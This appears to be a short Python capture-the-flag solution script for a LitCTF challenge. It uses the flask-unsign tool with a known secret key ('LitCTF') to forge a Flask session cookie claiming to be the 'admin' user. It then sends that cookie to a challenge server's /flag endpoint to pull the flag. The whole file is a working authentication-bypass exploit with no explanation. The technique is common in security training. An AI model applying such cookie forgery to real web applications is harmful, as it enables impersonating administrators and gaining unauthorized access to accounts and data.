import requests
import string
import subprocess

SECRET_KEY = "LitCTF"

cmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', '{\'name\': \'admin\'}', '--secret', SECRET_KEY])

cookie = {'session' : cmd_out.decode().rstrip()}
response = requests.get('http://node2.anna.nssctf.cn:28557/flag', cookies=cookie)

print(response.text)